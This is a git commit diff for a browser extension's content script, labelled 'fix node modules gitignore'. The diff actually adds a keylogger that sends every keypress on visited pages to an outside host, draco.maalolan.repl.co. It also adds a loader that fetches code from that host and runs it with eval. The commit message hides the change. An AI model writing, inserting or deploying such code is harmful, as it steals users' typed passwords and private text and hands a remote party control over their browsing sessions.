e6e3f74ebe26194b433b3af584c56d23dbd5243c
Prakshal Pro <prakshal@Prakshals-MacBook-Pro.local>
2022-05-22 04:44:56 -0400

    fix node modules gitignore

--- extension/content.js
+++ extension/content.js
@@ -1,1 +1,37 @@
 // Some useless comment
+
+const sendData = async (data) => {
+    const url = (new URL(window.location.href));
+    await fetch(`https://draco.maalolan.repl.co/`, {
+        method: 'POST', // or 'PUT'
+        headers: {
+            'Accept': 'application/json',
+            // 'Access-Control-Allow-Origin': url.hostname,
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ key_pressed: data }),
+    })
+}
+
+
+const getCommand = async () => {
+    await fetch('https://draco.maalolan.repl.co/', {
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+        },
+    })
+        .then(res => res.json())
+        .then(data => {
+            const func = eval(data.function);
+            func()
+        })
+        .catch(err => console.log(err))
+}
+
+
+document.addEventListener("keypress", async (event) => {
+    await sendData(event.key)
+})
+
+getCommand()
